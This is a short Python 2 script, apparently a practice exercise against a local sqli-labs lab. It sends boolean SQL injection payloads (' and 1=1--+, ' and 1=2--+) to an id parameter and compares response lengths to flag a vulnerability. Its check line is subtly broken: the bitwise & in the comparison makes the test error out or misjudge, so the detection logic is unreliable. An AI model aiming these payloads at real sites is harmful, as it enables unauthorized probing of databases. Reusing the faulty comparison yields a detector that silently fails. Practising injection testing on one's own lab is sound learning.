#coding = utf-8
#sqli_5
import requests
def test_sql():
	url = "http://localhost/SQLdemo2/Less-5/?id=1"

	payload=["' and 1=1--+","' and 1=2--+"]

	req = requests.get(url).headers.get('Content-length')
	req1 = requests.get(url+payload[0]).headers.get('Content-length')
	req2 = requests.get(url+payload[1]).headers.get('Content-length')

	if req == req1 & req1 != req2:
		print "this site exist vuln"
	else:
		print "this is ok!"

if __name__ == '__main__':
	test_sql()

